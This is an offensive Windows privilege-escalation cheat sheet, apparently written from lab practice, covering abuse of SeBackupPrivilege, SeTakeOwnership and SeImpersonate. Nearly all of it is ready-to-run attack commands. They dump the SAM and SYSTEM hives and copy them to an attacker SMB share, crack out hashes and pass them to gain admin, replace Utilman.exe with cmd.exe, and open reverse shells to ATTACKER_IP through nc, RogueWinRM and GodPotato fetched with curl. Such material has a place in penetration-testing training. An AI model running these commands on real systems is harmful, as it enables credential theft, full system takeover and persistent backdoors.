# Abuse Privilege

```powershell
> whoami /priv
```

For a full list of privileges on Windows systems, refer [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). Attackers generally focus on those that enable system escalation. A detailed list of exploitable privileges is available on the [Priv2Admin GitHub project](https://github.com/gtworek/Priv2Admin).

## SeBackupPrivilege&#x20;

<figure><img src="../../../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

This privilege allows the user to read all the files in the system.

Let's create a Temp directory and move into it.

```powershell
mkdir C:\Temp
cd C:\Temp
```

Exploit this privilege to read SAM and SYSTEM file via query.

> The **`SAM` (Security Account Manager)** hive contains local user account and group membership information, including their hashed passwords.&#x20;
>
> The **`SYSTEM`** hive contains system-wide configuration settings, such as the system boot key required to decrypt the password hashes stored in SAM

We will use the reg save command to perform a command in the registry, specify the location of the hive, and save it to a file in the current directory with the appropriate name.

```powershell
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

Now download the files to attacker machine

{% code title="evil-winrm shell" %}
```powershell
> download sam
> download system
```
{% endcode %}

<details>

<summary>SMB Server</summary>

{% code overflow="wrap" %}
```bash
impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 public share
```
{% endcode %}

This will create a share named `public` pointing to the `share` directory, which requires the username and password of our current windows session. After this, we can use the `copy` command in our windows machine to transfer both files.

```bash
C:\> copy c:\Temp\sam \\ATTACKER_IP\public\
C:\> copy c:\Temp\system \\ATTACKER_IP\public\
```



</details>

Now we can use `pypykatz` to read the content or we can use these files to dump hash with the tool `impacket-secretsdump`

<details>

<summary>Get files content with pypykatz</summary>

In kali these files is unreadable, but we can extract the hive secrets from SAM and SYSTEM file using pypykatz.

> **pypykatz**
>
> Mimikatz implementation in pure Python.&#x20;
>
> [https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)

```bash
pypykatz registry --sam sam system -o registry.dump
# registry: Get secrets from registry files
# --sam SAM: path to the SAM registry hive
```

Now in the file `registry.dump` we have this:

<figure><img src="../../../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

With hash of these account we can try to perform a PtH like this:

```bash
evil-winrm -i <IP> -u 'Administrator' -H '2b87e7c93a3e8a0ea4a581937016f341'
```

</details>

<details>

<summary>Dump hashes with impacket</summary>

```bash
impacket-secretsdump -sam sam -system system LOCAL
```

Use psexec to use the dumped credentials and take access to the target machine as administrator

{% code overflow="wrap" %}
```bash
impacket-psexec -hashes LM:NT administrator@MACHINE_IP
```
{% endcode %}

</details>



## SeTakeOwnership

The `SeTakeOwnership` privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable.

The standard method to use this privilege is:

1. Start a CMD as administrator
2. Search a Windows Program that is run with SYSTEM privileges. (Utilman, ...)
3. Taking ownership of the legitimate binary with the following command

```powershell
takeown /f C:\Windows\System32\Utilman.exe
```

As a file owner, you don't automatically have full control over it. However, you can grant yourself the necessary permissions. To gain full rights over the legitimate binary chose, use this command:

```powershell
icacls C:\Windows\System32\Utilman.exe /grant $USER:F
```

4. Replace the original binary for any payload we like.

```bash
copy cmd.exe utilman.exe
```



## SeImpersonate / SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

To use this privileges to elevate our privilege we can use these programs:

### RogueWinRM

{% embed url="https://github.com/antonioCoco/RogueWinRM" %}

```bash
# attacker machine
nc -lvp 4444

# target machine
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4444"
```

&#x20;

### GodPotato

{% embed url="https://github.com/BeichenDream/GodPotato" %}

Download the executable from the link above, and transfer it to a target machine.

<pre class="language-powershell"><code class="lang-powershell"># target machine
<strong>cd C:\ProgramData
</strong><strong>curl http://ATT_IP/godpotato.exe -o godpotato.exe
</strong><strong>
</strong><strong># attack machine 
</strong><strong>nc -lvpn 4444
</strong><strong>
</strong><strong># target machine
</strong><strong>.\godpotato.exe -cmd "cmd /c powershell -e REV_SHELL_PAYLOAD"
</strong></code></pre>

